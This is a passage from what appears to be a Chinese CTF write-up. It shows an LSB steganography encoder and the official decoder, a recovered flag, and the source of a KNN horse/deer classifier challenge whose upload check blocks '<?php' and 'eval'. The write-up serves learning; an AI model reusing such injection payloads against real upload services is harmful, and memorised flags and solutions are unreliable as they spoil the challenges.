class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,random</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image,ImageDraw</span><br><span class="line">p=Image.open(<span class="string">'flag.png'</span>).convert(<span class="string">'L'</span>)</span><br><span class="line">flag = []</span><br><span class="line">a,b = p.size</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(a):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(b):</span><br><span class="line">        <span class="keyword">if</span> p.getpixel((x,y)) == <span class="number">255</span>:</span><br><span class="line">            flag.append(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag.append(<span class="number">1</span>)</span><br><span class="line">key1stream = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">    key1stream.append(random.randint(<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">key2stream = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">    key2stream.append(random.randint(<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">enc = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">    enc.append(flag[i]^key1stream[i]^key2stream[i])</span><br><span class="line">hide=Image.open(<span class="string">'source.png'</span>).convert(<span class="string">'RGB'</span>)</span><br><span class="line">R=[]</span><br><span class="line">G=[]</span><br><span class="line">B=[]</span><br><span class="line">a,b = hide.size</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(a):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(b):</span><br><span class="line">        R.append(bin(hide.getpixel((x,y))[<span class="number">0</span>]).replace(<span class="string">'0b'</span>,<span class="string">''</span>).zfill(<span class="number">8</span>))</span><br><span class="line">        G.append(bin(hide.getpixel((x, y))[<span class="number">1</span>]).replace(<span class="string">'0b'</span>,<span class="string">''</span>).zfill(<span class="number">8</span>))</span><br><span class="line">        B.append(bin(hide.getpixel((x, y))[<span class="number">2</span>]).replace(<span class="string">'0b'</span>,<span class="string">''</span>).zfill(<span class="number">8</span>))</span><br><span class="line">R1=[]</span><br><span class="line">G1=[]</span><br><span class="line">B1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(key1stream)):</span><br><span class="line">    <span class="keyword">if</span> key1stream[i] == <span class="number">1</span>:</span><br><span class="line">        R1.append(R[i][:<span class="number">7</span>]+<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        R1.append(R[i][:<span class="number">7</span>]+<span class="string">'0'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(key2stream)):</span><br><span class="line">    <span class="keyword">if</span> key2stream[i] == <span class="number">1</span>:</span><br><span class="line">        G1.append(G[i][:<span class="number">7</span>]+<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        G1.append(G[i][:<span class="number">7</span>]+<span class="string">'0'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">    <span class="keyword">if</span> enc[i] == <span class="number">1</span>:</span><br><span class="line">        B1.append(B[i][:<span class="number">7</span>]+<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        B1.append(B[i][:<span class="number">7</span>]+<span class="string">'0'</span>)</span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> range(len(R)):</span><br><span class="line">    R[r] = int(R1[r],<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> g <span class="keyword">in</span> range(len(G)):</span><br><span class="line">    G[g] = int(G1[g],<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> range(len(B)):</span><br><span class="line">    B[b] = int(B1[b],<span class="number">2</span>)</span><br><span class="line">a,b = hide.size</span><br><span class="line">en_p = Image.new(<span class="string">'RGB'</span>,(a,b),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(a):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(b):</span><br><span class="line">        en_p.putpixel((x,y),(R[y+x*b],G[y+x*b],B[y+x*b]))</span><br><span class="line">en_p.save(<span class="string">'encode.png'</span>)</span><br></pre></td></tr></table></figure><p>根据加密脚本写解密脚本,这里直接贴官方wp的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image,ImageDraw</span><br><span class="line">p = Image.open(<span class="string">'encode.png'</span>).convert(<span class="string">'RGB'</span>)</span><br><span class="line">a,b = p.size</span><br><span class="line">R=[]</span><br><span class="line">G=[]</span><br><span class="line">B=[]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(a):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(b):</span><br><span class="line">        R.append(bin(p.getpixel((x,y))[<span class="number">0</span>]).replace(<span class="string">'0b'</span>,<span class="string">''</span>).zfill(<span class="number">8</span>))</span><br><span class="line">        G.append(bin(p.getpixel((x, y))[<span class="number">1</span>]).replace(<span class="string">'0b'</span>, <span class="string">''</span>).zfill(<span class="number">8</span>))</span><br><span class="line">        B.append(bin(p.getpixel((x, y))[<span class="number">2</span>]).replace(<span class="string">'0b'</span>, <span class="string">''</span>).zfill(<span class="number">8</span>))</span><br><span class="line">R1=[]</span><br><span class="line">G1=[]</span><br><span class="line">B1=[]</span><br><span class="line">flag=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(R)):</span><br><span class="line">    R1.append(int(R[i][<span class="number">-1</span>:]))</span><br><span class="line">    G1.append(int(G[i][<span class="number">-1</span>:]))</span><br><span class="line">    B1.append(int(B[i][<span class="number">-1</span>:]))</span><br><span class="line">print(R1[<span class="number">100</span>:<span class="number">150</span>])</span><br><span class="line">print(G1[<span class="number">100</span>:<span class="number">150</span>])</span><br><span class="line">print(B1[<span class="number">100</span>:<span class="number">150</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(R1)):</span><br><span class="line">    flag.append(B1[i]^G1[i]^R1[i])</span><br><span class="line">print(flag[<span class="number">100</span>:<span class="number">150</span>])</span><br><span class="line">de_p = Image.new(<span class="string">'L'</span>,(a,b),<span class="number">255</span>)</span><br><span class="line">c=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(a):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(b):</span><br><span class="line">        <span class="keyword">if</span> flag[c] == <span class="number">1</span>:</span><br><span class="line">            de_p.putpixel((x,y),<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            de_p.putpixel((x, y), <span class="number">255</span>)</span><br><span class="line">        c=c+<span class="number">1</span></span><br><span class="line">de_p.save(<span class="string">'out.png'</span>)</span><br></pre></td></tr></table></figure></p><p>好家伙,差点把我电脑跑死机<br><figure class="image-box">                <img src="./5.png" alt="图片" title class>                <p>图片</p>            </figure></p><p>flag{fa0a8cb83f26dead82e1a45f8af2f44b}</p><h2 id="指鹿为马"><a href="#指鹿为马" class="headerlink" title="指鹿为马"></a>指鹿为马</h2><p>show source code</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> operator</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_horse</span><span class="params">()</span>:</span></span><br><span class="line">data = []</span><br><span class="line">p = Image.open(<span class="string">'./horse.png'</span>).convert(<span class="string">'L'</span>)</span><br><span class="line">p = np.array(p).reshape(<span class="number">-1</span>)</span><br><span class="line">p = np.append(p,<span class="number">0</span>)</span><br><span class="line">data.append(p)</span><br><span class="line"><span class="keyword">return</span> np.array(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_deer</span><span class="params">()</span>:</span></span><br><span class="line">data = []</span><br><span class="line">p = Image.open(<span class="string">'./deer.png'</span>).convert(<span class="string">'L'</span>)</span><br><span class="line">p = np.array(p).reshape(<span class="number">-1</span>)</span><br><span class="line">p = np.append(p,<span class="number">1</span>)</span><br><span class="line">data.append(p)</span><br><span class="line"><span class="keyword">return</span> np.array(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_test</span><span class="params">(pic)</span>:</span></span><br><span class="line">data = []</span><br><span class="line">p = Image.open(pic).convert(<span class="string">'L'</span>)</span><br><span class="line">p = np.array(p).reshape(<span class="number">-1</span>)</span><br><span class="line">p = np.append(p,<span class="number">1</span>)</span><br><span class="line">data.append(p)</span><br><span class="line"><span class="keyword">return</span> np.array(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">euclideanDistance</span><span class="params">(instance1, instance2, length)</span>:</span></span><br><span class="line">distance = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(length):</span><br><span class="line">distance += pow((instance1[x] - instance2[x]), <span class="number">2</span>)</span><br><span class="line"><span class="keyword">return</span> math.sqrt(distance)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getNeighbors</span><span class="params">(trainingSet, testInstance, k)</span>:</span></span><br><span class="line">distances = []</span><br><span class="line">length = len(testInstance) - <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(len(trainingSet)):</span><br><span class="line">dist = euclideanDistance(testInstance, trainingSet[x], length)</span><br><span class="line">distances.append((trainingSet[x], dist))</span><br><span class="line">distances.sort(key=operator.itemgetter(<span class="number">1</span>))</span><br><span class="line">neighbors = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(k):</span><br><span class="line">neighbors.append(distances[x][<span class="number">0</span>])</span><br><span class="line"><span class="keyword">return</span> neighbors</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getResponse</span><span class="params">(neighbors)</span>:</span></span><br><span class="line">classVotes = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(len(neighbors)):</span><br><span class="line">response = neighbors[x][<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">if</span> response <span class="keyword">in</span> classVotes:</span><br><span class="line">classVotes[response] += <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">classVotes[response] = <span class="number">1</span></span><br><span class="line">sortedVotes = sorted(classVotes.items(), key=operator.itemgetter(<span class="number">1</span>), reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">return</span> sortedVotes[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAccuracy</span><span class="params">(testSet, predictions)</span>:</span></span><br><span class="line">correct = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(len(testSet)):</span><br><span class="line"><span class="keyword">if</span> testSet[x][<span class="number">-1</span>] == predictions[x]:</span><br><span class="line">correct += <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> (correct / float(len(testSet))) * <span class="number">100.0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(pic)</span>:</span></span><br><span class="line">source_p = Image.open(<span class="string">'deer.png'</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">c_p = Image.open(pic)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">"Please upload right picture."</span>)</span><br><span class="line">exit()</span><br><span class="line">diff_pixel = <span class="number">0</span></span><br><span class="line">a, b = source_p.size</span><br><span class="line"><span class="keyword">if</span> c_p.size[<span class="number">0</span>] != a <span class="keyword">and</span> c_p.size[<span class="number">1</span>] != b:</span><br><span class="line">print(<span class="string">"Please upload right picture size("</span>+str(a)+<span class="string">','</span>+str(b)+<span class="string">')'</span>)</span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(b):</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(a):</span><br><span class="line">diff_pixel += abs(source_p.getpixel((x, y)) - c_p.getpixel((x, y)))</span><br><span class="line"><span class="keyword">return</span> diff_pixel</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">print(<span class="string">'-'</span> * <span class="number">134</span>)</span><br><span class="line">print(<span class="string">'''      ____       __            _          _   _                _                              _   _            _</span></span><br><span class="line"><span class="string">|  __ \     / _|          | |        | | | |              | |                            | | | |          | |</span></span><br><span class="line"><span class="string">| |__) |___| |_ ___ _ __  | |_ ___   | |_| |__   ___    __| | ___  ___ _ __    __ _ ___  | |_| |__   ___  | |__   ___  _ __ ___  ___</span></span><br><span class="line"><span class="string">|  _  // _ \  _/ _ \ '__| | __/ _ \  | __| '_ \ / _ \  / _` |/ _ \/ _ \ '__|  / _` / __| | __| '_ \ / _ \ | '_ \ / _ \| '__/ __|/ _ \\</span></span><br><span class="line"><span class="string">| | \ \  __/ ||  __/ |    | || (_) | | |_| | | |  __/ | (_| |  __/  __/ |    | (_| \__ \ | |_| | | |  __/ | | | | (_) | |  \__ \  __/</span></span><br><span class="line"><span class="string">|_|  \_\___|_| \___|_|     \__\___/   \__|_| |_|\___|  \__,_|\___|\___|_|     \__,_|___/  \__|_| |_|\___| |_| |_|\___/|_|  |___/\___|</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">print(<span class="string">'-'</span>*<span class="number">134</span>)</span><br><span class="line">print(<span class="string">'\t1.show source code'</span>)</span><br><span class="line">print(<span class="string">'\t2.give me the source pictures'</span>)</span><br><span class="line">print(<span class="string">'\t3.upload picture'</span>)</span><br><span class="line">print(<span class="string">'\t4.exit'</span>)</span><br><span class="line">choose = input(<span class="string">'&gt;'</span>)</span><br><span class="line"><span class="keyword">if</span> choose == <span class="string">'1'</span>:</span><br><span class="line">w = open(<span class="string">'run.py'</span>,<span class="string">'r'</span>)</span><br><span class="line">print(w.read())</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">elif</span> choose == <span class="string">'2'</span>:</span><br><span class="line">print(<span class="string">'this is horse`s picture:'</span>)</span><br><span class="line">h = base64.b64encode(open(<span class="string">'horse.png'</span>,<span class="string">'rb'</span>).read())</span><br><span class="line">print(h.decode())</span><br><span class="line">print(<span class="string">'-'</span>*<span class="number">134</span>)</span><br><span class="line">print(<span class="string">'this is deer`s picture:'</span>)</span><br><span class="line">d = base64.b64encode(open(<span class="string">'deer.png'</span>, <span class="string">'rb'</span>).read())</span><br><span class="line">print(d.decode())</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">elif</span> choose == <span class="string">'4'</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">elif</span> choose == <span class="string">'3'</span>:</span><br><span class="line">print(<span class="string">'Please input your deer picture`s base64(Preferably in png format)'</span>)</span><br><span class="line">pic = input(<span class="string">'&gt;'</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">pic = base64.b64decode(pic)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">if</span> <span class="string">b"&lt;?php"</span> <span class="keyword">in</span> pic <span class="keyword">or</span> <span class="string">b'eval'</span> <span class="keyword">in</span> pic:</span><br><span class="line">print(<span class="string">"Hacker!!This is not WEB,It`s Just a misc!!!"</span>)</span><br><span class="line">exit()</span><br><span class="line">salt = str(random.getrandbits(<span class="number">15</span>))</span><br><span class="line">pic_name = <span class="string">'tmp_'</span>+salt+<span class="string">'.png'</span></span><br><span class="line">tmp_pic = open(pic_name,<span class="string">'wb'</span>)</span><br><span class="line">tmp_pic.write(pic)</span><br><span class="line">tmp_pic.close()</span><br><span class="line"><span class="keyword">if</span> check(pic_name)&gt;=<span class="number">100000</span>:</span><br><span class="line">print(<span class="string">'Don`t give me the horse source picture!!!'</span>)</span><br><span class="line">os.remove(pic_name)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">ma = load_horse()</span><br><span class="line">lu = load_deer()</span><br><span class="line">k = <span class="number">1</span></span><br><span class="line">trainingSet = np.append(ma, lu).reshape(<span class="number">2</span>, <span class="number">5185</span>)</span><br><span class="line">testSet = load_test(pic_name)</span><br><span class="line">neighbors = getNeighbors(trainingSet, testSet[<span class="number">0</span>], k)</span><br><span class="line">result = getResponse(neighbors)</span><br><span class="line"><span class="keyword">if</span> repr(result) == <span class="string">'0'</span>:</span><br><span class="line">os.system(<span class="string">'clear'</span>)</span><br><span class="line">print(<span class="string">'Yes,I want this horse like deer,here is your flag encoded by base64'</span>)</span><br><span class="line">flag = base64.b64encode(open(<span class="string">'flag'</span>,<span class="string">'rb'</span>).read())</span><br><span class="line">print(flag.decode())</span><br><span class="line">os.remove(pic_name)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">'I want horse but not deer!!!'</span>)</span><br><span class="line">os.remove(pic_name)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">'wrong choose!!!'</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>give me the source pictures<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">this is horse`s picture:</span><br><span class="line">iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAAAAABwhuybAAAFeElEQVR4nO2Xy28TVxTGvzN2ZpLYIY5dkgImIU4I2DFqQqiaqGpL2gXqv8AC2lUX/BFl032lSpWqblqpGyQ2LQhERQhUDSqk4ZnEtHnxCATn4TjP8fOeLmZszzPEUpeclefeM7/z3e/OfRh4G/9n+Dtk907v7jnKh42vc6690u5BTe/u1FsFyEPVgGoaqkAbw+pR5+m5689dq+5QxApSWjuO/DhbGoRgU6dcv7E7UH1472EUw2fuFDVS8e+UKblmX3JXoHBfiEKAOJjSClPOOpTOp2k3kCG19aN3IADA08habGyZk7nxRN2bFTWc8AuEWiWADtG8AIAF1ZLNrZ77SwynqIAa19cpHpMZgLddmcsTCpmwBACFZLGcFQ69TKoaivPragVKxl/9Z/YI/WlxRiVtoKC1qyoAtJzyAgAx66+LrWdPNu2KGL2n/el6vaFZntogzUBS8wCALXUPA2CQXl0KBPbdXtFfN5gdPxt68M210lNTNFj6mSxooJdWX5ibB3w20JEv9vLMqyeFUlJDtEX7pb4kSZIInFi3rTZuOWIdWuTLfUJiVNxjpUuZFwA8xwVAUzNYvTvgs03ZoYRqAsW+CgnAh3rDWL3t8tMCULMfAD0H8CxzbH+NQQ4A9jeYQF3fHR1LE/fXdHkMNaWD8kyGwAAKaQBIpkJBWRsf1YeCEgOSvmtqrW3fnxTp+2kiYov21alNAkDL1zLWQdW2xQMMcX1eKwoA9edPFjnQG2AWVg+CsSAA8LSNg8w/N1cq7ksA8P7nAuBAT4CJyDwz3HC0BcCLaRsHwModtZztBYC4XwDgpt6RJY/gBo+JVNslL6/N+f12Tl59PRczgXQsN937SRY43StM+d5ION9nx5DILSeWyqvQCwDjmz4GQBt/LQIYOqqYX5FqXTaPgz3p5flSEgDcveohgDyXRwFgctK2NbNzCA50HJYNoO2vL2xJ0uYv51UAyA5btyH3YBz4WPtEdXt8J7p5fGxbe1DO9QmXFx0i98NdA8gcvecUp2bnkB59m4XLSTsxUcUpye0H4AbKVeES2Bd2BWGyGklSozuoKknat+hSuSpJtAMod8NdkvPtxq1w4pFbD684XtuMZ78n3Fx+u7hWdKxMuZnNQFuNvcMI6vqk8h1yIzuBqHB58XgKDiTDAChSKyrheMJT4cpvOULqWX4nRZKX4Walzslf/bVAABw0WW9sBX222OFKTdlLV3Sj7SQLSEoOaQtfdMet0yalLo6UzmE7yaZoQ99BVItJxE8uJgCQv0ySjSm7u/kTide3bq0DQEenftmZHTvVZCC5ghjQ55S5sD1//552UwsNKAwAtPBHMnk2UCG5gho8QPbWGoGLanpxKau1Kv26iumRNYzCQLKCvB5NudzvFdL4BctqoN4IA6Dio9EMYCJZpka0HNNaYt0C6rB1VUXeAwBSR25rJ/joz6ul784AKqYBeD/o8QCQB+sgjScsnOCAAkBKDz0snYujQ6U+o6KHrwio6WsuCbppEaQMBBmgV9dmy84o7WScFz3SQwuE4sMlQD5ZB2li0syhnggDmP7d8D8i1i2gzllBSA0tiNGxAhCNOzjU3gOQeHBjzaBxsA7SZAKwzlrqRsu/RUAerBM2QcEBhUkdfVw0tEVjAupw1g7CygrgLEjpDzHSf84Zl4U8WCekSa2g0wfpKKgzwsgMvzC1RbvLghz3bEeH/B5QbtVaECVBTiD507KDO0c0LpC5mXUFxQyCDWG7XmqCJvQnu0dGBw2RXWPaNO1R0bhAplzQDup2FpSYZYhtW8GSIDtIcRaErBUdMwmyexSLOQqyhdkhh//9n/kEOQiyRfwYpKyhoA00PgU8frMg5C8JWp94c97bqMR/qKdMxhtIpukAAAAASUVORK5CYII=</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">this is deer`s picture:</span><br><span class="line">iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAAAAABwhuybAAAEXUlEQVR4nO2XS2xbRRSG/5l7b/xSb2wnDqbBSdU0FcQUmsRZVCAkorZJumkrFWEkWLJgyZINC5bsQQKEVAkhNRKJRKWqjUiFEAgUkYRQtYQ+ZCc4jzbk4dgkaWzfOSwSP+7D9r3Jtmc198ycz/+ZmTMzBp6Zc2N959wAXGdjDEDTxY6DggJfXT8FoOv7L/wArox/xG2FmUcpHsUNwKO4FYB3QNABQaCKyGi39pc9kKzT8p/Yb3pdfkhNSvTtpvu/2eLoQBfPfjkNAGh7+bTqlYIfs8aGha9XHYOkUyd7pgFAes/L8iIHldIzo4/scSpB2mPRpWYAwLtwK1EAINZW8jY5utQmzr8Uv5YB+MKnf9uNtwTdGbt8uWtW8tG4c44OVPiWBqJRiELSOUcHQvbqw4FjDR4qHBbU/mane0MJy+e2Z7VDgFj3W01ZhZFGL4bGx2wvVzG63IzF/TMjZwYYh0Dh1k2HpHKtxeIqJZcfaqRpRPLgkGI3cM9KqcXiKjHCfoWSPIiamviQd3KuspyL4FhcJcALLyuRampiJ4Y+OFMxL0VFvXGVAOpTTkg2NQktcGm5YsNxAGCxd/wAQIH+SElu3XkSgV6jotbXsptySNKfafXnCWGpvN1kANB+JzraLxnH1SVJFZMkA0BWcvlebTAfqSQPSjef1tJkAG0pA17F6mgm+XxoLCUseqxB9AveCO5lxhViABVjifd13vlzYctUepVZASiVCGsMKQAg2j8JCrDtmaelgYzl0umcEcQiR4jf/ax8TuzvI0qn9xrJxCsaoC3Pl9MjOdRiToUI5A8vlL6NJbP73bYQgrfplpCE2Qig1vejVUH46Z4EUIvfzrVIR989WRW0el0AcEdscADRfEmtBsKNJQ6g1WvrphYdxTIxgx7c5gCpYVuSwHtc1UDaaIYBUti4UayNwoFqIExMcQCyTZBbrQrKjhYA8cRWYQCSUhWEHxKySM7ZU1SqDdmiK/XNlfUnebsgVAfRyPNHWJljyJFZ/4IVCKnp/nK0K6iP3NmwDxK3OyNFkgi+rp/H3amUVYz123dlZL3UwbjevLE2+yDcu5ood+lTI48lyTI1ALPLvd3HJQBM7EqGsuOntUVTQI1FDn8YIIAt/2xYNmrpyUvB4pf2+d2aigAUCADY6o/GA7vVxRtEs8Fp74+G3hjn+X/WioDQwUEAWG5+bW9W+IXYYUBguflFAgBqjEftgaosB9u6NskAgPzHgZqTvR9Q5VnKVh4tsT4C9t9m9RSxjV+tSSKhZYcny3LrKGLp4T+sO9YXgcwwSk+kOorYxJTZ6eMAJXcAbN7IFDXVS23H7JLaGNjW3p2+W8r7AMvf/BwBqU2D9wCgdheQSxrvT+cgXwRgj1eMbuegVpUgEqY94RgkHeNg60smv2NQcwuB5syL6RjU7gLbmjP7nYJ8EQCpjLmjVokwTtxY+y80guUTpBtTD7Q95iF23+icBnb+1Y95UEPMM6uw/wEb7IPCRqC/gwAAAABJRU5ErkJggg==</span><br></pre></td></tr></table></figure></p><p>horse<figure class="image-box">                <img src="./7.jpg" alt="图片](./6.jpg)deer![图片" title class>                <p>图片](./6.jpg)deer![图片</p>            </figure></p><p>根据官方说的知识点  KNN图像识别漏洞 